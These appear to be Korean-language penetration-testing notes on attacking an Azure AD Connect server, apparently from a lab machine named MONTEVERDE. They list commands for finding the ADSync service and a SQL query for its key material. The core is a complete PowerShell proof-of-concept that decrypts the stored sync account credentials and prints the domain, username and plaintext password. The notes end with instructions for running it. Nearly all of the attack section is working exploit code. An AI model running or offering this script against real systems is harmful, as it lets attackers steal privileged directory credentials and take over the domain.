# Azure
- 서버에 `AAD_*`, `MSOL_*`가 있다면 Azure AD Connect 서버라고 추측할 수 있다.

<img width="868" height="485" alt="image" src="https://github.com/user-attachments/assets/30b97330-3c40-4466-ab6d-712ba911ced4" />

```powershell
# ADSync가 있는지 찾는 과정
Get-Process

tasklist

Get-Service

wmic.exe service get name

sc.exe query state= all

net.exe start

Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync
```
- `ADSync` : 온프레미스(로컬) AD의 계정, 그룹, 비밀번호 해시 등을 Azure AD로 복제(sync)해주는 서비스. 하나의 계정으로 온프레미스와 클라우드 모두 로그인 가능해짐.

```powershell
Get-ItemProperty -Path <service Path> | Format-list -Property * -Force
```
<img width="825" height="286" alt="image" src="https://github.com/user-attachments/assets/fba28c0a-16fa-432e-a6d8-73500cff0775" />

- 1.5.x 기준으로 아래는 DPAPI를 사용함.
```powershell
sqlcmd -S MONTEVERDE -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"
```
<img width="1117" height="169" alt="image" src="https://github.com/user-attachments/assets/7306dde5-621c-4da0-afa0-7d7cda5c2818" />

```powershell
# poc.ps1

Function Get-ADConnectPassword{
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"

$key_id = 1
$instance_id = [GUID]"1852B527-DD4F-4ECF-B541-EFCCBFF29E31"
$entropy = [GUID]"194EC2FC-F186-46CF-B44D-071EB61F49CD"

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']"| select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']"| select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name ='Password'; Expression = {$_.node.InnerXML}}
Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
}
```
```powershell
. .\poc.ps1

Get-ADConnectPassword
```
